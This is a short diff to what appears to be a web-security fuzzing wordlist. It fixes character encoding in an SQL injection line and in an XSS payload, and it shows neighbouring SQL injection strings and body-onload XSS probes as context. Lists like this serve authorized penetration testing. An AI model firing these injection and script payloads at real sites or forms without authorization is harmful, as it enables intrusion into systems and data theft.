@@ -161,7 +161,7 @@ a'
 ?
 ' AND 1=0) UNION ALL
 ' or 1=1
-‘ or 1=1 --
+? or 1=1 --
 x' AND userid IS NULL; --
 x' AND email IS NULL; --
 anything' OR 'x'='x
@@ -456,7 +456,7 @@ P:XSS-JSN:JSON:5
 <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
 <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
 <body/s/onload=x={doc:parent.document};x.doc.writeln(1)
-<body/â€?â€?$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
+<body/????$/onload=x={doc:parent[’document’]};x.doc.writeln(1)
 
 P:XSS-SSI:Server Side Includes:1
 > XSS | Replacive Fuzzers
@@ -713,6 +713,7 @@ k
 l
 m
 n
+
 o
 p
 q
